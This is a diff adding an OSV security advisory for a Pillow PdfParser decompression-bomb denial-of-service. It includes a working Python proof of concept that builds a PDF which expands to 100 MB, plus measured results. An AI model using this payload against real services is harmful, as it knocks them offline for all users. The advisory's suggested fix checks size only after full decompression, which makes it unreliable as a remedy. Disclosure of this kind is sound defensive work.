@@ -1,0 +1,121 @@
+{
+  "id": "PYSEC-2026-3495",
+  "modified": "2026-07-23T15:11:28.034031834Z",
+  "published": "2026-07-23T11:41:48.075769Z",
+  "aliases": [
+    "BIT-pillow-2026-59200",
+    "CVE-2026-59200",
+    "GHSA-jjj6-mw9f-p565"
+  ],
+  "summary": "Pillow: Decompression Bomb DoS via PdfParser.PdfStream.decode()",
+  "details": "### Summary\n`PdfParser.PdfStream.decode()` in Pillow's `PdfParser.py` calls `zlib.decompress()` with the `bufsize` parameter set to the value of the PDF stream's `Length` field, without any upper bound on the actual decompressed output size. Python's `zlib.decompress()` `bufsize` argument is an *initial output buffer hint*, not a maximum size limit — the function will expand memory until the full decompressed result is produced. A crafted PDF containing a FlateDecode-compressed stream decompresses to 1 GB of memory from a ~950 KB file, causing server OOM termination or severe degradation in any application that uses `PdfParser` to read untrusted PDF files.\n\n### Details\n`PdfStream.decode()` in `pdfminer/PdfParser.py` reads the stream's declared `Length` (or `DL`) field from the PDF dictionary and passes it as `bufsize` to `zlib.decompress()`:\n\n```python\n# PIL/PdfParser.py — PdfStream.decode()\nclass PdfStream:\n    def decode(self) -\u003e bytes:\n        try:\n            filter = self.dictionary[b\"Filter\"]\n        except KeyError:\n            return self.buf\n        if filter == b\"FlateDecode\":\n            try:\n                expected_length = self.dictionary[b\"DL\"]\n            except KeyError:\n                expected_length = self.dictionary[b\"Length\"]\n            return zlib.decompress(self.buf, bufsize=int(expected_length))\n            #                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n            #  bufsize is an *initial buffer hint*, NOT a maximum size limit.\n            #  zlib.decompress() allocates as much memory as needed regardless.\n```\n\nFrom the Python documentation: *\"The `bufsize` parameter is used as the initial size of the output buffer.\"* It does not cap decompression. An attacker who controls the PDF stream contents can provide a highly-compressed payload that expands to gigabytes, while setting `Length` to any value (including the actual compressed size) to avoid triggering format validation.\n\n`PdfParser` is instantiated with a filename or file object and calls `read_pdf_info()` on open, which parses the xref table and makes stream objects accessible. `PdfStream.decode()` is reachable whenever calling code accesses a compressed stream object from the parsed PDF.\n\n**Confirmed reachable path:**\n```python\nwith PdfParser.PdfParser(\"evil.pdf\") as pdf:\n    stream_obj, _ = pdf.get_value(pdf.buf, stream_offset)\n    data = stream_obj.decode()   # ← OOM here\n```\n\n\n### PoC\n\n```python\nimport zlib, tempfile, os, time\nfrom PIL import PdfParser\n\n# Build a minimal PDF with a 100 MB FlateDecode bomb (demo scale)\nEXPAND_MB = 100\nraw = b'\\x00' * (EXPAND_MB * 1_000_000)\ncompressed = zlib.compress(raw, level=9)   # ~97 KB\n\nbuf = b'%PDF-1.4\\n'\no1 = len(buf); buf += b'1 0 obj\\n\u003c\u003c /Type /Pages /Kids [] /Count 0 \u003e\u003e\\nendobj\\n'\no2 = len(buf); buf += b'2 0 obj\\n\u003c\u003c /Type /Catalog /Pages 1 0 R \u003e\u003e\\nendobj\\n'\no3 = len(buf)\nhdr = f'\u003c\u003c /Filter /FlateDecode /Length {len(compressed)} \u003e\u003e'.encode()\nbuf += b'3 0 obj\\n' + hdr + b'\\nstream\\n' + compressed + b'\\nendstream\\nendobj\\n'\nxref = len(buf)\nbuf += b'xref\\n0 4\\n0000000000 65535 f \\n'\nfor off in [o1, o2, o3]:\n    buf += f'{off:010d} 00000 n \\n'.encode()\nbuf += b'trailer\\n\u003c\u003c /Size 4 /Root 2 0 R \u003e\u003e\\nstartxref\\n' + str(xref).encode() + b'\\n%%EOF\\n'\n\nprint(f\"PDF size: {len(buf):,} bytes ({len(buf)/1024:.1f} KB)\")\n\nwith tempfile.NamedTemporaryFile(delete=False, suffix='.pdf') as f:\n    f.write(buf); tmpname = f.name\n\nwith PdfParser.PdfParser(tmpname) as pdf:\n    obj, _ = pdf.get_value(pdf.buf, o3)\n    t = time.time()\n    decoded = obj.decode()\n    print(f\"Decoded: {len(decoded):,} bytes in {time.time()-t:.3f}s\")\n\nos.unlink(tmpname)\n```\n\n**Actual output (Pillow 12.1.1, Python 3.12):**\n```\nPDF size: 97,538 bytes (95.3 KB)\nDecoded: 100,000,000 bytes in 0.265s\n```\n\n**Measured expansion:**\n\n| PDF file size | Memory allocated | Ratio | Wall time |\n|---|---|---|---|\n| 10 KB | 10 MB | 1,026× | 0.024 s |\n| 95 KB | 100 MB | 1,028× | 0.265 s |\n| 475 KB | 500 MB | 1,028× | 1.279 s |\n| 950 KB | 1,000 MB (1 GB) | 1,028× | 2.668 s |\n\n### Impact\nThis is a denial-of-service vulnerability. Any application that uses `PIL.PdfParser.PdfParser` to read untrusted PDF files is affected. An unauthenticated attacker who can submit a PDF for processing can exhaust all available server memory with a ~950 KB file, causing OOM termination or service degradation affecting all concurrent users. No authentication or user interaction beyond submitting the file is required.\n\n**Note:** This vulnerability is independent of CVE-2025-64512 / CVE-2025-70559 (pdfminer.six) and the companion `PIL/PdfImagePlugin.py` decompression issue. It exists specifically in Pillow's own `PdfParser.py` module, which is distinct from pdfminer.six.\n\n**Suggested fix:**\n\n```python\nMAX_DECOMPRESS_BYTES = 200 * 1024 * 1024  # 200 MB cap\n\ndef decode(self) -\u003e bytes:\n    ...\n    if filter == b\"FlateDecode\":\n        ...\n        result = zlib.decompress(self.buf, bufsize=int(expected_length))\n        if len(result) \u003e MAX_DECOMPRESS_BYTES:\n            msg = \"Decompressed stream exceeds maximum allowed size\"\n            raise ValueError(msg)\n        return result\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pillow",
+        "purl": "pkg:pypi/pillow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.1.0"
+            },
+            {
+              "fixed": "12.3.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "10.0.0",
+        "10.0.1",
+        "10.1.0",
+        "10.2.0",
+        "10.3.0",
+        "10.4.0",
+        "11.0.0",
+        "11.1.0",
+        "11.2.1",
+        "11.3.0",
+        "12.0.0",
+        "12.1.0",
+        "12.1.1",
+        "12.2.0",
+        "5.1.0",
+        "5.2.0",
+        "5.3.0",
+        "5.4.0",
+        "5.4.0.dev0",
+        "5.4.1",
+        "6.0.0",
+        "6.1.0",
+        "6.2.0",
+        "6.2.1",
+        "6.2.2",
+        "7.0.0",
+        "7.1.0",
+        "7.1.1",
+        "7.1.2",
+        "7.2.0",
+        "8.0.0",
+        "8.0.1",
+        "8.1.0",
+        "8.1.1",
+        "8.1.2",
+        "8.2.0",
+        "8.3.0",
+        "8.3.1",
+        "8.3.2",
+        "8.4.0",
+        "9.0.0",
+        "9.0.1",
+        "9.1.0",
+        "9.1.1",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pillow/PYSEC-2026-3495.yaml"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-jjj6-mw9f-p565"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59200"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/pull/9718"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/commit/f7a31ea75e460e108c37126da1f47812f21f6b09"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/python-pillow/Pillow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/releases/tag/12.3.0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://pypi.org/project/pillow"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-jjj6-mw9f-p565"
+    }
+  ]
+}
